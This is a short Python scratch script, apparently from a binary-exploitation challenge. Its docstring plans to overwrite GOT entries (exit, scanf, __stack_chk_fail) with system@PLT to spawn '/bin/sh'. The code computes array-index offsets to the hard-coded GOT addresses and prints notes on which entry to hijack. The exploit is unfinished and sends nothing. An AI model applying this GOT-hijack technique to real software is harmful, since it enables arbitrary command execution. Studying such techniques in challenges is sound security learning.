#!/usr/bin/env python3
"""
CORRECT STRATEGY:
1. Write command "/bin/sh" to values[]
2. Point msg to "/bin/sh"  
3. Overwrite exit@GOT with system@PLT
4. Trigger scanf ERROR (send non-integer) → handle_error() → exit(1) becomes system(msg)
   BUT system() will receive exit code (1) as arg, NOT msg!

BETTER: Write command at specific location system() will read from.
When handle_error() calls: system("echo ERROR OCCURRED")
We can't change the string argument easily...

ACTUALLY BEST: Hijack scanf or another function!
"""
import socket
import struct

values_base = 0x6010c0
msg_addr = 0x601068
system_plt = 0x4006c0

# Let's check what functions are available to hijack
functions_got = {
    'scanf': 0x601030,    # From readelf
    '__stack_chk_fail': 0x601048,
    'puts': 0x601020,
    'printf': 0x601040,
    'system': 0x601038,
    'exit': 0x601050,
    '__libc_start_main': 0x601058
}

print("Available GOT entries:")
for name, addr in functions_got.items():
    offset = (addr - values_base) // 4
    print(f"  {name:20s} @ {hex(addr):10s} offset: {offset}")

print("\n[!] Key insight: We need to hijack a function that:")
print("    1. Gets called AFTER we setup our payload")
print("    2. Can execute system() with our controlled argument")
print("    3. Doesn't crash before executing our command")

print("\n[*] Best target: __stack_chk_fail@GOT")
print("    If we corrupt a stack value, program calls __stack_chk_fail")
print("    We can hijack it to system() with our command!")
